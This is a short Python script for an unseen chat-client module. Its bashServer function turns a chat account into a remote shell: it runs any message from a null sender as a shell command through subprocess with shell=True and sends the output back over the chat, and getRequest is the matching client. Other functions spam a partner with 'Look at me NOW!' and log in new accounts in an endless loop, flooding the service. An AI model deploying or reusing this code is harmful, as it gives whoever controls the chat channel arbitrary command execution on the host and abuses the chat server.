import subprocess as sub
import time
import basiccommands as base

def getResponse(ID):
	response = {}
	while 'events' not in response:
		response = base.keep(ID)
	return response

def connect(ID1,ID2):
	origin = ''
	while origin != ID2:
		base.disconnect(ID2)
		base.login(ID1)
		base.login(ID2)
		eventlecian=getResponse(ID1)['events']
		for event in eventlecian:
			print(event)
			if event['type'] == 'connected':
				origin = event['from']

def attend(ID,pause=1):
	while True:
		for event in getResponse(ID)['events']:
			print(event['type']+"\tfrom "+event['from']+"\t@"+event['time']+'\t|'+event['content'])

def connectAll(baseID):
	i = 0
	while True:
		base.login(baseID+str(i))
		i = i +1


def bashServer(baseID,pause=1):
	cat = baseID+"_cat"
	hat = baseID+"_hat"
	connect(cat,hat)
	while True:
		base.chat(hat,cat,"Look at me NOW!")
		base.keep(cat)
		response = base.keep(hat)
		if 'events' in response:
			for event in response['events']:
				print('e')
				print(event)
				if event['type'] == 'connected':
					1
				elif event['type'] == 'disconnected':
					connect(cat,hat)
				elif event['type'] == 'msg':
					if event['from'] == None:
						name = event['content'].splitlines()[0]
						command = '\n'.join(event['content'].splitlines()[1:])
						try:
							stdoutdata = sub.check_output(command,shell=True)
							output = stdoutdata.decode('ascii', 'ignore')
						except:
							output = 'ERROR'
						base.chat(None,name,output)
				elif event['type'] == 'question':
					1
		time.sleep(pause)

def getRequest(ID,target,request):
	base.chat(None,target,ID+'\n'+request)
	return getResponse(ID)['events'][0]['content']
